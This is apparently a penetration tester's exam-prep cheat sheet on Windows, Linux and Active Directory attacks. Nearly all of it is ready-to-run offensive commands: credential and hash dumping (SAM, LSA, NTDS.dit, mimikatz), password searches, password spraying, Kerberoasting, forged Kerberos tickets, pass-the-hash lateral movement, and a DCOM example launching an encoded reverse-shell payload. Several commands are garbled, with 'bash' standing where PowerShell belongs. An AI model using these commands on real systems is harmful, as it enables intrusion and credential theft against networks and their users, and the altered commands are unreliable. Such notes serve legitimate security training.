%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

C:\windows.old

# First go to c:
dir /s SAM
dir /s SYSTEM
```

- Obtaining Hashes from SYSTEM and SAM

```bash
# always mention local in the command
impacket-secretsdump -system SYSTEM -sam SAM local 
# Now a detailed list of hashes are displayed
```

## Sensitive files

```bash
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
Findstr /si password *.config 
findstr /si pass/pwd *.ini  

dir /s *pass* == *cred* == *vnc* == *.config*  

in all files  
findstr /spin "password" *.*  
findstr /spin "password" *.*
```

## Config files

```bash
c:\sysprep.inf  
c:\sysprep\sysprep.xml  
c:\unattend.xml  
%WINDIR%\Panther\Unattend\Unattended.xml  
%WINDIR%\Panther\Unattended.xml  

dir /b /s unattend.xml  
dir /b /s web.config  
dir /b /s sysprep.inf  
dir /b /s sysprep.xml  
dir /b /s *pass*  

dir c:\*vnc.ini /s /b  
dir c:\*ultravnc.ini /s /b   
dir c:\ /s /b | findstr /si *vnc.ini
```

## Registry

```bash
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

# Putty keys
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
# Check the values saved in each session, user/password could be there
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" 

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"  
reg query "HKCU\Software\TightVNC\Server"  

# Windows autologin  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  

# SNMP Paramters  
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  

# Putty  
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  

# Search for password in registry  
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /s
```

## RunAs - Savedcreds

```powershell
# Displays stored credentials, looks for any optential users
cmdkey /list 
# Transfer the reverseshell
runas /savecred /user:admin C:\Temp\reverse.exe
```

## Pass the Hash

```bash
# If hashes are obtained though some means then use psexec, smbexec and obtain the shell as different user.
pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
```

---

# Linux Privilege Escalation

- [Privesc through TAR wildcard](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)

## TTY Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'
```

## Basic

```bash
find / -writable -type d 2>/dev/null
# Installed applications on debian system
dpkg -l 
# Listing mounted drives
cat /etc/fstab 
# Listing all available drives
lsblk 
# Listing loaded drivers
lsmod 

# Checking processes for credentials
watch -n 1 "ps -aux | grep pass" 
# Password sniffing using tcpdump
sudo tcpdump -i lo -A | grep "pass" 

```

## Automated Scripts

```bash
linPEAS.sh
LinEnum.sh
linuxprivchecker.py
unix-privesc-check
Mestaploit: multi/recon/local_exploit_suggester
```

## Sensitive Information

```bash
cat .bashrc
# checking environment variables
env 
# Harvesting active processes for credentials
watch -n 1 "ps -aux | grep pass" 
# Process related information can also be obtained from PSPY
```

## Sudo/SUID/Capabilities

[GTFOBins](https://gtfobins.github.io/)


```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```

## Cron Jobs

```bash
# Detecting Cronjobs
cat /etc/crontab
crontab -l

# handy tool to livemonitor stuff happening in Linux
pspy 

# inspecting cron logs
grep "CRON" /var/log/syslog 
```

## NFS

```bash
# Mountable share
# On targets
cat /etc/exports 
# On attacker
showmount -e <target IP> 
# Check for "no_root_squash" in the output of shares

mount -o rw <targetIP>:<share-location> <directory path we created>
# Now create a binary there
chmod +x <binary>
```

---

# Post Exploitation

> This is more windows specific as exam specific.

<aside>
💡 Run WinPEAS.exe - This may give us some more detailed information as no we’re a privileged user and we can open several files, gives some edge!

</aside>

## PowerShell History

```bash
type %userprofile%\AppData\Roaming\Microsoft\Windows\bash\PSReadline\ConsoleHost_history.txt

# Example
type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\bash\PSReadline\ConsoleHost_history.txt 
```

## Searching for passwords

```bash
dir .s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```

## Searching in Registry for Passwords

```bash
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

<aside>
💡 Always check documents folders, i may contain some juicy files

</aside>

## KDBX Files

```powershell
# These are KeyPassX password stored files
dir /s /b *.kdbx 
Get-ChildItem -Recurse -Filter *.kdbx
```
```bash
# Cracking...
keepass2john Database.kdbx > keepasshash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
```

## Dumping Hashes

1. Use Mimikatz
2. If this is a domain joined machine, run BloodHound.

---

# Active Directory Enumeration

## Enumeration

```powershell
# to check local admins 
net localgroup Administrators 
```

## Powerview

```powershell
# loading module to bash, if it gives error then change execution policy
Import-Module .\PowerView.ps1
# basic information about the domain 
Get-NetDomain 
# list of all users in the domain
Get-NetUser 
# The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is sideheading for   the output of above command. we can select any number of them seperated by comma.
# enumerate domain groups
Get-NetGroup 
# information from specific group
Get-NetGroup "group name" 
# enumerate the computer objects in the domain
Get-NetComputer 
# scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
Find-LocalAdminAccess 
# Checking logged on users with Get-NetSession, adding verbosity gives more info.
Get-NetSession -ComputerName files04 -Verbose 
# Listing SPN accounts in domain
Get-NetUser -SPN | select samaccountname,serviceprincipalname 
# enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
Get-ObjectAcl -Identity <user> 
# converting SID/ObjSID to name 
Convert-SidToName <sid/objsid> 

# Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights 

# find the shares in the domain
Find-DomainShare 

# identifying AS-REP roastable accounts
Get-DomainUser -PreauthNotRequired -verbose

# Kerberoastable accounts
Get-NetUser -SPN | select serviceprincipalname 
```

## Bloodhound

- Collection methods - database

```powershell
# Sharphound - transfer sharphound.ps1 into the compromised machine
Import-Module .\Sharphound.ps1 
# collects and saved with the specified details, output will be saved in windows compromised machine
Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" 

# Bloodhound-Python
bloodhound-python -u 'user' -p 'password' -ns <rhost> -d <domain-name> -c all # output will be saved in you kali machine
```

- Running Bloodhound

```bash
sudo neo4j console
# then upload the .json files obtained
```

## LDAPDOMAINDUMP

- These files contains information in a well structured webpage format.

```bash
# Do this in a new folder
sudo ldapdomaindump ldaps://IP -u 'username' -p 'password' 
```

## PsLoggedon

```powershell
# To see user logons at remote system of a domain(external tool)
.\PsLoggedon.exe \\<computername>
```

## GPP or CPassword

- Impacket

```bash
# with a NULL session
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

# with cleartext credentials
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# pass-the-hash (with an NT hash)
Get-GPPPassword.py -hashes :'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# parse a local file
Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
```

- SMB share - If SYSVOL share or any share which `domain` name as folder name

```bash
# Download the whole share
https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
# Navigate to the downloaded folder
grep -inr "cpassword"
```
- CME

```bash
crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password
```

- Decrypting the CPassword

```bash
gpp-decrypt "cpassword"
```

# Active Directory Attacks

<aside>
💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds.
</aside>

## Zerologon

- [Exploit](https://github.com/VoidSec/CVE-2020-1472)
- We can dump hashes on target even without any credentials.

## Password Spraying

```bash
# Crackmapexec - check if the output shows 'Pwned!'
# use continue-on-success option if it's a subnet
crackmapexec smb <IP or subnet> -u users.txt -p 'password' -d <domain> --continue-on-success 

# Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```

## AS-REP Roasting

See https://github.com/Br14n41/asrep-roaster 

## Kerberoasting

```bash
# dumping from compromised windows host, and saving with customname
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast 

# from kali machine
impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request 

# cracking hashes
hashcat -m 13100 hashes.txt wordlist.txt --force 
```

## Silver Tickets

- Obtaining hash of an SPN user using **Mimikatz**

```bash
privilege::debug
# obtain NTLM hash of the SPN account here
sekurlsa::logonpasswords 
```

- Obtaining Domain SID

```powershell
whoami /user
# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain SID is "S-1-5-21-1987370270-658905905-1781884369"
```

- Forging silver ticket Ft **Mimikatz**

```bash
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
exit

# we can check the tickets by,
ps> klist
```

- Accessing service

```bash
ps> iwr -UseDefaultCredentials <servicename>://<computername>
```

## Secretsdump

```bash
impacket-secretsdump <domain>/<user>:<password>@IP
# local user
impacket-secretsdump user@IP -hashes lmhash:ntlmhash 
# domain user
impacket-secretsdump domain/user@IP -hashes lmhash:ntlmhash 
```

## Dumping NTDS.dit

```bash
impacket-secretsdump <domain>/<user>:<password>@IP -just-dc-ntlm
# use -just-dc-ntlm option with any of the secretsdump command to dump ntds.dit
```

# Active Directory Lateral Movement

## psexec - smbexec - wmiexec - atexec

- Here we can pass the credentials or even hash, depending on what we have

> *Always pass full hash to these tools!*

```bash
impacket-psexec <domain>/<user>:<password1>@IP
# the user should have write access to Admin share then only we can get sesssion

impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@IP <command> 
# we passed full hash here

impacket-smbexec <domain>/<user>:<password1>@IP

impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@IP <command> 
# we passed full hash here

impacket-wmiexec <domain>/<user>:<password1>@IP

impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@IP <command> 
# we passed full hash here

impacket-atexec -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@IP <command>
# we passed full hash here
```

## winrs

```bash
winrs -r:<computername> -u:<user> -p:<password> "command"
# run this and check whether the user has access on the machine, if you have access then run a bash reverse-shell
# run this on windows session
```

## crackmapexec

```bash
# supported services
crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} 
# Bruteforcing attack, smb can be replaced. Shows "Pwned"
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success 
# grepping the way out!
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' 
# Password spraying, viceversa can also be done
crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  

# Try --local-auth option if nothing comes up
# lists all shares, provide creds if you have one
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares

# lists all disks
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --disks

# lists all users, provide DC ip
crackmapexec smb <DC-IP> -u 'user' -p 'password' --users

# lists active logon sessions
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sessions

# dumps password policy
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --pass-pol

# dumps SAM hashes
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sam

# dumping lsa secrets
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --lsa

# dumps NTDS.dit file
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds

# lists users of a specific group
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname}

# execute command in cmd
crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command'

# Pass the hash
crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
# We can run all the above commands with hash and obtain more information

# crackmapexec modules
# listing modules
crackmapexec smb -L 
# shows the required options for the module
crackmapexec smb -M mimikatx --options 
# runs default command
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz 
# runs specific command -M 
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' 
```

## Crackmapexec database

```bash
# to launch the console
cmedb 
# run this command to view some others, running individual commands give infor on all the data till now we did.
help 
```

## Pass the ticket

```powershell
.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$
```

## DCOM

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.150.8"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

$dcom.Document.ActiveView.ExecuteShellCommand("bash",$null,"bash -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

## Golden Ticket

1. Get the krbtgt hash

```powershell
.\mimikatz.exe
privilege::debug
# below are some ways
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch
lsadump::dcsync /user:krbtgt

kerberos::purge # removes any exisiting tickets

# sample command
kerberos::golden /user:sathvik /domain:evilcorp.com /sid:S-1-5-21-510558963-1698214355-4094250843 /krbtgt:4b4412bbe7b3a88f5b0537ac0d2bf296 /ticket:golden

# Saved with name "golden" here, there are other options to check as well
```

1. Obtaining access!

```bash
# no need for highest privileges
mimikatz.exe 
kerberos::ptt golden
# we're accessing cmd
misc::cmd 
```

## Shadow Copies

```bash
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
---
